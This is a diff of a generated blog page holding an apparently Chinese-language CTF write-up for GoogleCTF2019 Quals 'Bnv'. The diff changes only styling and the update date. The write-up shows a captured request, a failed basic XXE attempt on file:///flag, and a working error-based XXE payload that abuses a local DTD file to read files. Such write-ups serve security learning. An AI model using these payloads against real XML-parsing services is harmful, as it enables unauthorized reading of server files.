@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -240,13 +248,13 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：8 个月前
+                  本文最后更新于：9 个月前
                 
               </p>
             
             <div class="markdown-body">
               <h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/08/5a5f87e50976a9cd.png" srcset="/img/loading.gif"><br><code>submit</code>抓包   </p>
-<div class="hljs"><pre><code>POST /api/search HTTP/1.1
+<pre><code>POST /api/search HTTP/1.1
 Host: c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
 Accept: */*
@@ -258,19 +266,19 @@ Origin: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn
 Connection: close
 Referer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/
 
-&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre></div>
+&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre>
 <p><code>json</code><br>尝试sqli，不行<br>有json的地方可能存在<code>xxe</code><br><code>Content-type</code>改为<code>application/xml</code>   </p>
-<div class="hljs"><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE message [
 &lt;!ELEMENT message (#PCDATA)&gt;
 &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;
-&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre></div>
+&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre>
 <p>返回<code>No result found</code>     </p>
 <p>看来不行    </p>
 <p>WP：</p>
 <p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/xlllovelife/topics/1220539"><code>利用本地DTD文件进行XXE</code></a>       </p>
 <p>payload:</p>
-<div class="hljs"><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE message[
     &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
     &lt;!ENTITY % ISOamso &#39;
@@ -280,7 +288,7 @@ Referer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/
     &amp;#x25;error;
 &#39;&gt;
 %local_dtd;
-]&gt;</code></pre></div>
+]&gt;</code></pre>
 
             </div>
             <hr>
@@ -438,6 +446,8 @@ Referer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/
 
 
 
+  
+    
   
 
 
